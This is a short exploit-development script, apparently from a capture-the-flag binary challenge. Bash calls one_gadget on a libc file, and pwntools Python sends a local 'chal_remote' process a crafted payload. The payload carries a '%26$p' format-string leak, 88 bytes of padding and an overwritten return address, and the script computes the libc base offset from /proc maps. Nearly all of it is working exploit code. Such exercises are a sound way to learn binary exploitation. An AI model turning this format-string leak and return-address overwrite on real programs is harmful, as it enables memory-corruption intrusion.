#!/bin/bash
cd /work/waf
echo "=== one_gadget ==="
one_gadget /work/waf/libc.so.6
echo "=== confirm %26$p offset & leak position via chal_remote ==="
cd /work/waf/waf
python3 - <<'PY'
import os
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
libc=ELF("/work/waf/libc.so.6",checksec=False)
p=process("./chal_remote")
p.recvuntil(b">> ")
pay=(b"exit"+b"X%26$pX").ljust(88,b"A")+p64(0x4010d4)
p.send(pay); import time; time.sleep(0.2)
pid=p.pid
maps=open(f"/proc/{pid}/maps").read()
lb=min(int(l.split('-')[0],16) for l in maps.splitlines() if "libc.so.6" in l)
out=p.recv(timeout=1); p.close()
import re
m=re.search(rb"X(0x[0-9a-f]+)X",out)
if m:
    v=int(m.group(1),16)
    print("leak %26$p =",hex(v),"libc_base=",hex(lb),"offset=",hex(v-lb))
else:
    print("no leak, out=",out[:80])
PY
